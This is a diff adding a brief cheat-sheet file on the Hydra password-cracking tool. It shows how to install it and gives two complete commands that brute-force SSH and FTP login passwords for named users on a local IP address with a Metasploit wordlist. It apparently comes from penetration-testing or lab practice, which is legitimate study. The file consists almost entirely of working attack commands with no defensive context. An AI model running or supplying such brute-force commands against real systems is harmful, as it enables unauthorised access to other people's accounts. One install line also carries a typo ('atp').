@@ -1,0 +1,17 @@
+##########################
+## HYDRA
+##########################
+
+# installing hydra commad line tool
+apt install hydra
+
+# installing the GUI
+atp install hydra-gtk
+
+# launching hydra on SSH daemon (port 22) that runs on 192.168.0.26
+# it's trying to brute-force the password of user mark using a wordlist
+hydra -l mark -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 10 ssh://192.168.0.26:22
+
+# launching hydra on FTP daemon (port 21) that runs on 192.168.0.26
+# it's trying to brute-force the password of user toor using a wordlist
+hydra -l toor -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 10 ftp://192.168.0.26:21
